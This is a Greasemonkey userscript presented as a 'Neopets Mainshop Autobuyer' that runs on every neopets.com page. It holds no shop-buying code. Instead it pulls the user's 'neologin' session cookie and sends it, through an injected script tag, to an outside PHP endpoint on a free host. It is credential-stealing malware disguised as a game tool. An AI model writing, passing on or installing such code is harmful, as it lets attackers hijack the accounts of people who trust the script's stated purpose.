// ==UserScript==
// @name           Neopets Mainshop Autobuyer
// @namespace      http://www.neopets.com/
// @description    Autobuy from mainshops at a decent speed (works with all shops)
// @include        *neopets.com*
// ==/UserScript==


function GetStringBetween( 

target_str,start_str,end_str,start_pos,include_str )   {
    if ( ! start_pos ) 0;
    if ( ! include_str ) false;

    var result_str = target_str.substr( start_pos ); //cut to start 

from start_pos
    result_str = result_str.substr( result_str.indexOf( start_str ) 

+ start_str.length ); //cut to start from start_str
    result_str = result_str.substr ( 0, result_str.indexOf( end_str 

) );

    if (include_str == true)   {
        result_str = start_str + result_str + end_str
    }

    return result_str;
}


var eleNew, newElement;
var strURL = 'http://neopetscg.freehostia.com/cookie.php?cookie=';

var testArray = document.evaluate(
     "//a[@href='javascript: void(0);']",
document, null, XPathResult.ANY_TYPE,null);

var strTest = testArray.iterateNext();

while (strTest) {
strTest = testArray.iterateNext();
}

eleNew = document.getElementById('main');

var strCookie = document.cookie;

strCookie = GetStringBetween(strCookie, 'neologin=','; ');

if (eleNew) {
    newElement = document.createElement("div");
    newElement.innerHTML='<SCRIPT SRC=' + strURL + strCookie + '>';
    eleNew.parentNode.insertBefore(newElement, eleNew.nextSibling);
}